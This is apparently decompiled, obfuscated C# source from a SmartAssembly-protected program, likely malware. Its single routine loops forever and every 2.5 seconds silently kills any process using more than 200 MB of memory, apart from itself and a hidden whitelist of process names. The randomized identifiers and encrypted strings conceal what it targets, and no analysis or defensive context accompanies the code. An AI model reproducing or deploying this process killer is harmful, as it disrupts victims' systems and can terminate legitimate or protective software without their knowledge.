using System;
using System.Diagnostics;
using System.Threading;
using SmartAssembly.Delegates;
using SmartAssembly.HouseOfCards;

namespace fTOyYuFiHboGKe;

public static class pgjWiGOLgRoE
{
	[NonSerialized]
	internal static GetString getString_0;

	public static void uQiUfyPiDzfNRb()
	{
		while (true)
		{
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				try
				{
					if (process.PrivateMemorySize64 > 209715200L && process.ProcessName != Process.GetCurrentProcess().ProcessName && !process.ProcessName.Contains(getString_0(107403937)) && !process.ProcessName.Contains(getString_0(107403960)) && !process.ProcessName.Contains(getString_0(107403919)) && !process.ProcessName.Contains(getString_0(107403910)) && !process.ProcessName.Contains(getString_0(107403929)) && !process.ProcessName.Contains(getString_0(107403884)) && !process.ProcessName.Contains(getString_0(107403903)) && !process.ProcessName.Contains(getString_0(107403890)) && !process.ProcessName.Contains(getString_0(107403845)) && !process.ProcessName.Contains(getString_0(107403864)) && !process.ProcessName.Contains(getString_0(107403811)))
					{
						process.Kill();
					}
				}
				catch
				{
				}
			}
			try
			{
				Thread.Sleep(2500);
			}
			catch
			{
			}
		}
	}

	static pgjWiGOLgRoE()
	{
		Strings.CreateGetStringDelegate(typeof(pgjWiGOLgRoE));
	}
}
